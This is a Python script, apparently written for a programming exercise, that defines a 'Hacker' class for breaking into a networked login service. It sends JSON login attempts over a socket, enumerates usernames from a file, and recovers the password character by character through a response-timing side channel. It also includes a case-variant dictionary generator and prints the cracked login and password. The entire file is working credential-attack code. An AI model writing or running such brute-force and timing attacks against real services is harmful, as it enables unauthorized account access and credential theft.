import argparse
from itertools import product
import json
import socket
from string import ascii_lowercase, ascii_uppercase, digits
import sys
import time


class Hacker:
    def __init__(self) -> None:
        self.parser = argparse.ArgumentParser(description="Hacking password")
        self.parser.add_argument("ip", type=str, help="IP address of resource")
        self.parser.add_argument("port", type=int, help="Port of IP address")
        self.ip_address, self.port, self.password = "", 0, ''
        self.buffer = 1024
        self.symbols = ascii_lowercase + ascii_uppercase + digits

    def send_request(self, data, client_socket):
        data = json.dumps(data, indent=4)
        data = data.encode()
        client_socket.send(data)
        t_start = time.perf_counter()
        response = client_socket.recv(self.buffer)
        all_time = time.perf_counter() - t_start
        response = response.decode()
        response = json.loads(response)
        result = response['result']
        return result, all_time

    def parse(self) -> None:
        if len(sys.argv) < 3:
            print("Not enough arguments")
            sys.exit(1)
        args = self.parser.parse_args()
        self.ip_address = args.ip
        self.port = args.port

    def connect_brute_force(self) -> None:
        with socket.socket() as client_socket:
            hostname = self.ip_address
            port = self.port
            address = (hostname, port)

            client_socket.connect(address)
            # generator = self.generator()
            # pass_generator = self.smart_generator("passwords.txt")
            # login_generator = self.smart_generator("logins.txt")
            with open("logins.txt", "r") as f:
                logins = (line for line in f.read().splitlines())
            # while result != "Wrong password":
            for login in logins:
                # self.password = "".join(next(pass_generator))
                # login = "".join(next(login_generator))
                data = {"login": login, "password": self.password}
                result, timer = self.send_request(data, client_socket)
                if result == "Wrong password!":
                    break
            while result != "Connection success!":
                generator = self.generator()
                # if result == "Exception happened during login" or timer > 0.1:
                if timer > 0.1:
                    self.password += ' '
                    data = {"login": login, "password": self.password}
                    result, timer = self.send_request(data, client_socket)
                # while result != "Exception happened during login" or timer > 0.1:
                while timer <= 0.1:
                    if result == "Connection success!":
                        break
                    self.password = self.password[:-1]
                    letter = "".join(next(generator))[0]
                    self.password += letter
                    data = {"login": login, "password": self.password}
                    result, timer = self.send_request(data, client_socket)
            print(json.dumps({"login": login, "password": self.password}))
            
    def generator(self) -> str:
        for length in range(1, len(self.symbols) + 1):
            for combination in product(self.symbols, repeat=length):
                yield ''.join(combination)

    @staticmethod
    def smart_generator(filename: str) -> str:
        data = []
        with open(filename, "r") as f:
            while line := f.readline():
                data.append(line.rstrip())
        base_dictionary, dictionary = [], []

        for word in data:
            password = []
            for index, symbol in enumerate(word):
                buffer = []
                if not symbol.isnumeric():
                    buffer.append(symbol.upper())
                    buffer.append(symbol.lower())
                else:
                    buffer.append(symbol)
                    buffer.append(symbol)
                password.append(buffer)
            base_dictionary.append({word: password})

        for words in base_dictionary:
            for word in list(words.values()):
                smart_len = 2**len(word)
                for i in range(0, smart_len, 1):
                    line = []
                    hashmap = list("0" * (len(word) - len("{:0b}".format(i))) + "{:0b}".format(i))
                    for j, k in zip(word, hashmap):
                        line.append(j[int(k)])
                    yield ''.join(line)


def main():
    hacker = Hacker()
    hacker.parse()
    hacker.connect_brute_force()


if __name__ == "__main__":
    main()
